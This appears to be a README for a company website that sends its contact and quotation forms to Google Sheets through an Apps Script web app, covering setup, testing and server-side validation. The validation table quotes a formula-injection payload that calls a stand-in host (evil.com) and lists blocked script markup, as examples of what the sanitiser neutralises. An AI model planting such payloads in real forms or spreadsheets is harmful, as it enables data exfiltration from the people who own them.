# Website forms → Google Sheets

Both website forms post to a Google Apps Script Web App, which appends each
submission to its own sheet inside one spreadsheet.

| Form on the site | Sheet tab | Created |
| --- | --- | --- |
| Contact us | `Contact` | automatically on first submission |
| Request a quotation | `RFQ` | automatically on first submission |

Columns are written in the order defined by `FORMS` in `Code.gs`, with a
`Timestamp` column first and `Source page` / `Referrer` last. The header row is
added and frozen the first time a sheet is created — don't reorder the columns
by hand afterwards, change `FORMS` instead.

## Setup (once, ~5 minutes)

1. Create a Google Sheet. Name it something like *FEROKINZA — website
   enquiries*. Leave the default `Sheet1` alone; the script makes its own tabs.
2. In that sheet: **Extensions → Apps Script**.
3. Delete the placeholder `myFunction` code, paste in the whole of
   [`Code.gs`](Code.gs), and save.
4. **Deploy → New deployment → Web app**:
   - *Description*: `ferokinza forms`
   - *Execute as*: **Me**
   - *Who has access*: **Anyone**  ← required; "Anyone with Google account"
     will not work for public website visitors
5. Authorise when prompted. Google shows an "unverified app" warning because
   the script is yours and unpublished — **Advanced → Go to … (unsafe)** is the
   expected path here.
6. Copy the Web app URL. It ends in `/exec`.
7. Open `index.html`, find `var ENDPOINT = '';` near the top of the page script,
   and paste the URL between the quotes.
8. Commit and push.

## Testing before you go live

Test in two stages, so a failure tells you which half is at fault.

### Stage 1 — the endpoint on its own (no website involved)

```sh
./apps-script/test-endpoint.sh 'https://script.google.com/macros/s/AKfy.../exec'
```

Expect `{"ok":true}` three times, then a test row in each of the `Contact` and
`RFQ` tabs. The rows are marked `local test` in the *Source page* column — delete
them when you are done.

If this fails, the problem is the deployment, not the page:

| Response | Cause |
| --- | --- |
| HTML login page | *Who has access* is not set to **Anyone**. Redeploy. |
| `{"ok":false,"error":"unknown form"}` | The `form` value did not match a key in `FORMS`. |
| Nothing / connection error | Wrong URL. It must end in `/exec`, not `/dev`. |

### Stage 2 — the real page from your machine

```sh
cd /path/to/ferokinza
python3 -m http.server 8000
```

Open **http://localhost:8000** — not the file directly. Opening `index.html`
from disk gives the page a `file://` origin, and the browser blocks its request
before it ever leaves your machine.

Paste the `/exec` URL into `var ENDPOINT` in `index.html` first, then submit the
contact form. On success the form is replaced by the thank-you panel and a row
appears in the sheet with `http://localhost:8000/` in *Source page*.

Keep DevTools open on the **Network** tab while you submit:

| What you see | Meaning |
| --- | --- |
| One `exec` request, status 200 | Working. |
| An `OPTIONS` request first | The body is no longer being sent url-encoded — that triggers a CORS preflight Apps Script cannot answer. |
| Console shows `origin not allowed: …` | The page's origin is not accepted. The message names the origin it received — add it to `ALLOWED_ORIGINS` and redeploy a new version. |
| CORS error in the console | You opened the page over `file://`, or the deployment is unreachable. |
| Inline red error on the page | The request failed. The page offers a pre-filled email instead, so nothing is lost. |

`ALLOWED_ORIGINS` lists only the live domains, so a local page is refused with
*"This form cannot be submitted from http://localhost:8000"*. To test the page
locally, temporarily add your local origin to that array and redeploy a new
version — then remove it again.

The `curl` test in stage 1 is unaffected: requests with no origin are allowed
through, which is why that stage works without touching the config.

### Once live

Submit both forms on ferokinza.com and confirm a row lands plus a notification
email arrives at `NOTIFY_EMAIL`.

## Settings in `Code.gs`

| Constant | Purpose |
| --- | --- |
| `NOTIFY_EMAIL` | Address copied on every submission. Set to `''` to turn off. |
| `ALLOWED_ORIGINS` | Domains permitted to post. Add a staging or local origin here if you need one. |
| `DUPLICATE_WINDOW_SECONDS` | Window in which a repeat submission from the same address is treated as a double-click. |
| `INCOTERMS` | Accepted values for the RFQ Incoterm field. |
| `FORMS` | Sheet name and column list per form. |
| `SPREADSHEET_ID` | Leave blank unless the script is not bound to the sheet. |

## After editing the script

Apps Script serves the **deployed** version, not the saved one. After changing
`Code.gs`: **Deploy → Manage deployments → edit (pencil) → Version: New
version → Deploy**. The `/exec` URL stays the same.

## Validation and sanitising

Every field is checked server-side before anything is written. The page runs the
same rules first so people get told immediately, but the browser copy is only a
convenience — anyone can bypass it, so `Code.gs` is the actual gate.

| Guard | What it does |
| --- | --- |
| Formula injection | A value starting `=`, `+`, `-` or `@` is prefixed with an apostrophe, so `=IMPORTXML("http://evil.com",…)` is stored as text instead of running in your sheet. The apostrophe is not displayed. |
| Markup and scripts | `<script>`, `<iframe>`, `<svg onload=…>`, `javascript:`, `data:text/html` and inline event handlers are rejected with a message. |
| Angle brackets | Deliberately allowed on their own — `seal <2mm` and `flange >50mm` are normal in a parts enquiry. Only real tags and schemes are blocked. |
| Length limits | Per field, matching the `max` values in `FORMS`. Message 3,000, product spec 4,000. Longer input is truncated, not rejected. |
| Field types | Email, phone, date (`YYYY-MM-DD`) and Incoterm are format-checked; Incoterm must be one of `INCOTERMS`. |
| Control characters | Stripped, along with runs of blank lines. |
| Duplicates | The same email submitting the same form inside `DUPLICATE_WINDOW_SECONDS` is accepted but not written twice, so a double-click gives one row. |
| Honeypot | A hidden `website` field. Anything that fills it gets a success response and is discarded. |

Rejections come back as `{"ok":false,"code":"validation","error":"…"}` and the
page shows the message against the form without offering the email fallback —
the input is the problem, not the connection.

## Notes and limits

- Spam control is the honeypot, the origin allowlist and the content rules
  above. If spam still gets through, the next step is a reCAPTCHA check inside
  `doPost`.
- Apps Script quotas on a free account are roughly 20,000 web-app calls and 100
  notification emails per day — far above what this site will produce.
- The endpoint URL is public in the page source. Anyone who finds it can post
  rows to the sheet, so treat it as a mailbox rather than a trusted database.
  It grants no access to the spreadsheet itself.
- File uploads are not supported. The RFQ form asks people to email drawings
  and BOQs separately.
